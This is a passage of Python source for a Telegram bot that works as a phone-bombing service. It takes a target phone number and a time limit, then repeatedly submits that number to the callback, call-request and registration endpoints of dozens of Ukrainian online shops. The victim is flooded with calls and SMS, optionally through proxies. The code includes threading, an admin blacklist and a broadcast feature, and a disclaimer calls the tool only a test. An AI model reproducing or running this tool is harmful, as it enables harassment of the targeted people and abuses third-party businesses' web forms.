    "uaId": "UA-53329668-1",
    "clientId": "428965036.1663000448",
    "pageUrl": "https://pancer.com.ua/ua/travmaticheskie-pistolety"})
        d = requests.post('https://safari.dp.ua/ua/feedback/callback',headers=headers, data={'firstname': name,'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'callbackForm','isAjax': 1})
        d = requests.post('https://pcshop.ua/index.php?route=account/register/validateFirstStep',headers=headers,data={'lastname': name,'firstname': surname,'email': email,'telephone': aa,'password': '','fax':  '','address_1':  '','city':  '','country_id':''  ,'zone_id':  '','newsletter': 1})
        d = requests.post('https://vest.in.ua/index.php?route=extension/module/oct_popup_call_phone/send',headers=headers,data={'referer': 'https://vest.in.ua/ua/tehnika-i-elektronika/category-compyuterna-pereferiya/categoria-klaviatura/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDBmbIgBvL5q4ku4tRhYzu3o9povZONfxRVsiTVmBjnZKTad1TT95zhoC-pQQAvD_BwE','telephone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        d = requests.post('https://elmir.ua/response/load_json.php',headers=headers,data={'cb_phone': f'{aa[2:5]}-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}','day': 'd255','hour': 'h9','minute': 'm0','later': 1,'url': 'https://elmir.ua/keyboard/','type': 'callback','state': 'call'})
        d = requests.post('https://kvshop.com.ua/callrequest',headers=headers,json={"name": name,"phone": f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        d = requests.get(f'https://touch.com.ua/ajax.php?act=getCallback&phone={aa}')
        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call-postponed?timestamp=1663019019605&utcOffset=-180',headers=headers,data={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620","timestamp": 1663048800000,"uaId": "UA-72798113-9","clientId": "286334084.1662909385","pageUrl": "https://anix.ua/ua/elf-bar"})
        d = requests.post('https://www.mandrivnik.com.ua/ajax/callMe.php',headers=headers,data={'un': name,'uph': number_plus})
        d = requests.post('https://steko.phonet.com.ua/rest/public/widget/call-catchers/a9ed83ce-75fe-4f52-bada-8a0fe7247f0a/call-postponed?timestamp=1663020130539&utcOffset=-180',headers=headers,json={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "cpc","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "3619279d-10b7-478e-a098-e71656bbf774","timestamp": 1663048800000,"uaId": "UA-45617472-4","clientId": "1754693290.1663020106","pageUrl": "https://online.steko.com.ua/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDGM6GLpYdA28DzU6e5R-dGncNeEJJWgd0NurEpl4yTB-yVxqp8apKBoCTr0QAvD_BwE"})
        d = requests.post('https://denika.ua/index.php?route=extension/callback/callback_phone/send',headers=headers,data={'data[name]': name,'data[phone]': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        d = requests.post('https://agat-m.com.ua/send.php',headers=headers,data={'name': name,'phone': number_plus})
        d = requests.get(f'https://bond.od.ua/newclient///?phone=+{aa}}',headers=headers)
        d = requests.post('https://megasport.ua/api/feedback/sendCallback/?language=ua',headers=headers,json={"phone": number_plus})
        d = requests.post('https://megasport.ua/api/auth/phone/?language=ua',headers=headers,json={'phone': number_plus})        coun+=1
        print(f'Круг {coun}')
    except:
        print(d.text)
    print('все')

@bot.message_handler(commands=["addbl"])
def addbl(message):
    try:
        if message.chat.id == ADMIN_CHAT_ID:
            newloser = f'{message.text[7:]}'
            if newloser == '':
                bot.send_message(ADMIN_CHAT_ID, "Введи номер id користувача")
            else:
                f = open('idBL.txt' , 'a')
                f.write(f'{newloser}' + '\n')
                f.close()
                bot.send_message(ADMIN_CHAT_ID, "Добавлен новий користувач в чорний список: "+f'{newloser}')
        else:
            bot.send_message(message.chat.id, "Доступно тільки админу")
    except:
        pass

@bot.message_handler(commands=['delbl'])
def delbl(message):
    try:
        if message.chat.id == ADMIN_CHAT_ID:
            idunban = f'{message.text[7:]}'
            with open("idBL.txt") as file:
                arrayBL = [row.strip() for row in file]
                if idunban == '':
                    bot.send_message(ADMIN_CHAT_ID, "Введи id користувача.")
                elif idunban in arrayBL:
                    sss = open('idBL.txt', 'r').read().replace(f'{idunban}', '')
                    f = open('idBL.txt', 'w')
                    f.write(sss)
                    f.close()
                    bot.send_message(ADMIN_CHAT_ID, 'Готово.')
                else:
                    bot.send_message(ADMIN_CHAT_ID, 'Такого юзера не найдено')
        else:
            bot.send_message(message.chat.id, "Доступно тільки админу")
    except:
        pass

def start_spam(chat_id, phone_number, force,second,prox,name):
    running_spams_per_chat_id.append(chat_id)
    bot.send_message(5112839866,f'{name} почав спам на номер {phone_number} і на {second} секунд')


    bot.send_message(chat_id, f'<b>👨‍💻Номер телефона: {phone_number}\n🙈Таймер: на {second} секунд\n😄Спам успішно почався!</b>', parse_mode='HTML')
    end = datetime.now() + timedelta(seconds=int(second))
    vv = datetime.now() + timedelta(seconds=300)
    while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        if end > vv:
            bot.send_message(chat_id,'Ти ввів забагато часу! треба вводити менше 300 секунд')
            break
        
        if prox == '-':
            send_for_number(phone_number)
        elif prox == '+':
            send_for_number_https(phone_number)
        else:
            bot.send_message(chat_id,'❌ПОМИЛКА не правильно шось введено')
            break
    bot.send_message(chat_id, f'<b>Спам на номер {phone_number} закінченний</b>', parse_mode='HTML')
    THREADS_AMOUNT[0] -= 1 # стояло 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass

def spam_handler(phone, chat_id,sec,prox,name,force=False):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, 'Ви вже почали спам. Дочекайтесь закінчення або нажміть ❌Зупинити спам і поробуйте знов')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force,sec,prox,name))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, 'Сервера зараз перегружені. Попробуйте знов через пару хвилин.')

@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    try:
        chat_id = int(message.chat.id)
        text = message.text
        name = message.from_user.first_name
    
        if text == '🤖Інформація':
            bot.send_message(chat_id,'''
В спальні під ліжком жив собі павук -
В чорний горошок, мав аж вісім рук.
Майже ніколи взагалі не спав.
Справжній мисливець! Завжди полював.
Я назвав його Богдан! Він мав рот, як чемодан.
 
Бодя - бос всіх павуків! Він їв мух і комарів.
Хавав в мене прямо з рук - дресерований павук!
Б-Б-Б-Бодька - бос всіх павуків. Він їв мух і комарів.
Хавав то саме, шо я. Шкода, Бодьки вже нема.
 
Бо Бодька коротше сильно захотів,
Жінку під ліжко він собі привів.
А павучиха - рідкісна коза,
З'їла лахудра Бодьку-павука.
А мораль є такова - з'їла баба мужика!
 
Бодя - бос всіх павуків! Він їв мух і комарів.
Хавав в мене прямо з рук - дресерований павук!
Б-Б-Б-Бодька - бос всіх павуків. Він їв мух і комарів.
Хавав то саме, шо я. Шкода, Бодьки вже нема.
 
Бодя був без галімих пантів.
Без багатих батьків, Бодя був з нормальних пацанів.
Бодя не любив тупих піжонів.
Бодя не носив брудних кальсонів.
Бодя карав биків.
 
Бодька помагав, не бухав, не втікав.
Кайфу не ламав, у підставах участі не брав.
Бодька бошував кришував, правду-мать рубав.
І якщо було за шо, то пальці легенько ломав.
 
Бодя поважав старших типів.
Бодя грав тих кого хтів, але тільки не там де їв.
Бодя не хамів, хіба шо до хамів.
А хамів карав так само, як биків.
 
Бодя був чорний і білий, Бодя не був дебілом.
Але його кобіта вважала не так.
І врешті не стерпіла і щось червоне підлила -
І Бодьку отруїла і Бодьку трапив шлях.
 
Бодя - бос всіх павуків! Він їв мух і комарів.
Хавав в мене прямо з рук - дресерований павук!
Б-Б-Б-Бодька - бос всіх павуків. Він їв мух і комарів.
Хавав то саме, шо я. Шкода, Бодьки вже нема.
 
Бодя - бос всіх павуків!
 
Бодька - бос всіх павуків! Він їв мух і комарів.
Хавав то саме, шо я. Шкода, Бодьки вже нема.
Бодя - бос всіх павуків!''', parse_mode='HTML')
    

        elif text == '☎️Запуск спама':
            bot.send_message(chat_id, '<b>Введи номер без + в форматі:\n🇺🇦 380xxxxxxxxx seconds +/-\n</b>\nПриклад: 380xxxxxxxxx 50 +', parse_mode='HTML')

        elif text == '📈Статистика':
            bot.send_message(chat_id, f'📊Статистика відображається в реальному часі!\nКористувачів🙎‍♂: {users_amount[0]}<b>\nВ боті 40 сервісів</b>', parse_mode='HTML')

        elif text == '🔥Розсилка' and chat_id==ADMIN_CHAT_ID:
            bot.send_message(chat_id, 'Введи повідомлення в форматі: "РОЗІСЛАТИ: ваш_текст"')

        elif text == '❗️ FAQ':
            bot.send_message(chat_id, 'Ви автоматом берете відповідальність за користування цим ботом. Ми не несем відповідальності за ваші дії, тільки тест! дякую за увагу.')

        elif text == '❌Зупинити спам':
            if chat_id not in running_spams_per_chat_id:
                bot.send_message(chat_id, 'Спам ще не починався')
            else:
                running_spams_per_chat_id.remove(chat_id)

        elif text == 'addbl':
            addbl(message)

        elif text == 'delbl':
            delbl(message)

        elif 'РОЗІСЛАТИ: ' in text and chat_id==ADMIN_CHAT_ID:
            msg = text.replace("РОЗІСЛАТИ: ","")
            send_message_users(msg)
        
        elif len(text) >= 12 <= 19:
            sec = message.text.split()[1]
            prox = message.text.split()[2]
            num = message.text.split()[0]
            phone = text
            spam_handler(num, chat_id,sec,prox,name)

        else:
            bot.send_message(chat_id, f'Номер введений неправильно. Введено {len(text)} символів, а треба 12')
    except IndexError:
        pass
  
if __name__ == '__main__':
    bot.polling(none_stop=True)
